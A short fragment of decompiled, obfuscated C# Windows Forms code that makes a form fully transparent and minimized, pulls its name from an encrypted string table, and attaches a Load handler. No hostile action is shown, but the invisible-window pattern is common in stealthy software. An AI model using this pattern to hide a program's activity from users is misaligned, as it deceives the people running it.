		((Form)this).set_Opacity(0.0);
		((Control)this).set_Name(getString_0(107391410));
		((Control)this).set_Text(getString_0(107391410));
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form0_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static Form0()
	{
		Strings.CreateGetStringDelegate(typeof(Form0));
	}
}
